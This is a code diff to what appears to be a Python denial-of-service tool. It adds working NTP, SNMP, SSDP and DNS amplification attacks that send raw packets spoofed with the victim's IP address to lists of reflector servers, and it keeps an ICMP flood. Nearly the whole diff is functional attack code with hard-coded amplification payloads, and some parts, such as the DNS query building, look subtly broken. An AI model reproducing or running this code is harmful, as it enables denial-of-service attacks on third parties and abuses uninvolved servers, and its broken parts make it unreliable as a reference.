@@ -1,11 +1,12 @@
-import os
 import sys
 import time
 import socket
 import random
 import signal
+import struct
 import threading
-from scapy.layers.inet import IP, ICMP
+import scapy.layers.inet
+from pinject import IP, UDP
 from scapy.sendrecv import send
 
 
@@ -93,7 +94,7 @@ class ATTACK:
             self.bytes = self.bytes + payload_bytes
 
     def icmp_flood(self):
-        packet = IP(dst=self.args.target_ip) / ICMP()
+        packet = scapy.layers.inet.IP(dst=self.args.target_ip) / scapy.layers.inet.ICMP()
         packet_bytes = len(packet)
         while True:
             send(packet, verbose=False)
@@ -112,14 +113,81 @@ class ATTACK:
     #                  '\x00\x00', verbose=0)
 
     def ntp_amplification(self):
-        print('\n' + ' ' * 23 + 'NTP Reflecting on %s:%d\n' % (self.args.target_ip, self.args.target_port))
-        # packet = IP(dst=ntpserver, src=self.args.target_ip) / UDP(sport=random.randint(2000, 65535), dport=123) / Raw(load=data)
+        print('\n' + ' ' * 23 + 'NTP Reflecting on %s:%d\n' % (self.args.target_ip, 123))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        payload = ('\x17\x00\x02\x2a'+'\x00'*4)
+        ntp_server_list = []
+        for ntp_server in open(self.args.file, "r"):
+            ntp_server = ntp_server.strip()
+            if ntp_server != "":
+                ntp_server_list.append(ntp_server)
+        for ntp_server in ntp_server_list:
+            udp = UDP(random.randint(1, 65535), 123, payload).pack(self.args.target_ip, ntp_server)
+            ip = IP(self.args.target_ip, ntp_server, udp, proto=socket.IPPROTO_UDP).pack()
+            sock.sendto(ip + udp + payload, (ntp_server, 123))
+            # send(scapy.layers.inet.IP(dst=self.args, src=self.args.target_ip) /
+            #      (UDP(sport=52816) /
+            #       NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))
 
     def snmp_amplification(self):
-        print('SNMP Amplification Attack')
+        print('\n' + ' ' * 23 + 'SNMP Reflecting on %s:%d\n' % (self.args.target_ip, 161))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        payload = ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
+                   '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
+                   '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
+                   '\x01\x02\x01\x05\x00')
+        snmp_server_list = []
+        for snmp_server in open(self.args.file, "r"):
+            snmp_server = snmp_server.strip()
+            if snmp_server != "":
+                snmp_server_list.append(snmp_server)
+        for snmp_server in snmp_server_list:
+            udp = UDP(random.randint(1, 65535), 161, payload).pack(self.args.target_ip, snmp_server)
+            ip = IP(self.args.target_ip, snmp_server, udp, proto=socket.IPPROTO_UDP).pack()
+            sock.sendto(ip + udp + payload, (snmp_server, 161))
 
     def ssdp_amplification(self):
-        print('SSDP Amplification Attack')
+        print('\n' + ' ' * 23 + 'SSDP Reflecting on %s:%d\n' % (self.args.target_ip, 1900))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        payload = ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
+                   'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+        ssdp_server_list = []
+        for ssdp_server in open(self.args.file, "r"):
+            ssdp_server = ssdp_server.strip()
+            if ssdp_server != "":
+                ssdp_server_list.append(ssdp_server)
+        for ssdp_server in ssdp_server_list:
+            udp = UDP(random.randint(1, 65535), 1900, payload).pack(self.args.target_ip, ssdp_server)
+            ip = IP(self.args.target_ip, ssdp_server, udp, proto=socket.IPPROTO_UDP).pack()
+            sock.sendto(ip + udp + payload, (ssdp_server, 1900))
+
+
+    def get_qname(self, domain):
+        labels = domain.split('.')
+        qname = ''
+        for label in labels:
+            if len(label):
+                qname += struct.pack('B', len(label)) + label
+        return qname
+
+    def get_dns_query(self, domain):
+        id = struct.pack('H', random.randint(0, 65535))
+        qname = self.get_qname(domain)
+        payload = ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
+                   '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
+                   '\x00\x00\x00\x00\x00\x00').format(id, qname)
+        return payload
 
     def dns_amplification(self):
-        print('DNS Amplification Attack')
+        print('\n' + ' ' * 23 + 'DNS Reflecting on %s:%d\n' % (self.args.target_ip, 53))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        domain_list = []
+        for domain in open(self.args.file, "r"):
+            domain = domain.strip()
+            if domain != "":
+                domain_list.append(domain)
+        for domain in domain_list:
+            payload = self.get_dns_query(domain)
+            udp = UDP(random.randint(1, 65535), 53, payload).pack(self.args.target_ip, domain)
+            ip = IP(self.args.target_ip, domain, udp, proto=socket.IPPROTO_UDP).pack()
+            sock.sendto(ip + udp + payload, (domain, 53))
